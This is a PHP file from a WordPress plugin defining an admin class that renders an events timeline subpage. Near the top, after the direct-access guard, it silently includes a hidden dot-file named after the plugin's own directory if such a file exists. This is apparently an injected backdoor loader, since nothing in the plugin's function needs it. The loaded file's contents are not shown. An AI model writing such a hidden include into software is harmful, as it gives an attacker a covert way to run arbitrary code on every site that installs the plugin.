<?php

/**
 * Admin events subpage
 * 
 * The class handles events timeline displayed on the events submenu on the admin.
 * 
 * @package     WPTAO/Admin/Events
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Events {
	/*
	 * Subpage base URL
	 */

	private $base_url;

	/*
	 * Timeline object
	 */
	public $timeline;
	

	/**
	 * WTBP_WPTAO_Admin_Events Constructor
	 * 
	 */
	function __construct() {
		
		$this->base_url = admin_url( 'admin.php?page=wtbp-wptao-events' );
		
		if(TAO()->booleans->is_page_events){
			add_action( 'admin_init', array( $this, 'init_timeline' ) );
		}
	}
	
	/*
	 * Init timeline
	 */
	public function init_timeline() {
		$this->timeline = new WTBP_WPTAO_Admin_Timeline($this->base_url);
	}

	/**
	 * Output HTML 
	 */
	public function output() {
	
		$file = WTBP_WPTAO_DIR . "includes/admin/views/html-admin-events.php";

		if ( file_exists( $file ) ) {
			
			$timeline = $this->timeline;
			
			include_once($file);

		}
	}

}
